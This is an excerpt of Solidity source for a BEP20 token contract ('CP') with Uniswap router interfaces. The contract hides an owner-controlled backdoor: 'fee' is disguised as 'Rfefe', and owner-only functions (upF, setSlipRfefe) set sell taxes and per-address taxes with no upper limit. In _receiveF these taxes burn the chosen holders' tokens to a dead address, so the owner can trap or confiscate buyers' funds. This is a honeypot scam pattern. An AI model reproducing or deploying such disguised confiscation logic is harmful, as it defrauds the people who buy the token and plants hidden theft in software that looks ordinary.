...
interface IUniswapV2Factory {
    ...
    function RfefeTo() external view returns (address);
    function RfefeToSetter() external view returns (address);
    ...
    function setRfefeTo(address) external;
    function setRfefeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingRfefeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingRfefeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingRfefeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingRfefeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingRfefeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CP is BEP20, Ownable {
    ...
    uint256 private _defaultSellRfefe = 0;

    uint256 private _defaultBuyRfefe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipRfefe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellRfefe = _value;
    }

    function setSlipRfefe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipRfefe[_address] = _value;
    }

    function getSlipRfefe(address _address) external view onlyownar returns (uint256) {
        return _slipRfefe[_address];
    }


    function setMAccountRfefe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountRfefe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeRfefeAmount = 0;

        if (rF) {
            uint256 tradeRfefe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeRfefe = _defaultSellRfefe;
                }
                if (from == uniswapV2Pair) {

                    tradeRfefe = _defaultBuyRfefe;
                }
            }
            if (_slipRfefe[from] > 0) {
                tradeRfefe = _slipRfefe[from];
            }

            tradeRfefeAmount = _Amount.mul(tradeRfefe).div(100);
        }


        if (tradeRfefeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeRfefeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeRfefeAmount);
            emit Transfer(from, _deadAddress, tradeRfefeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeRfefeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeRfefeAmount);
        emit Transfer(from, _to, _Amount - tradeRfefeAmount);
    }
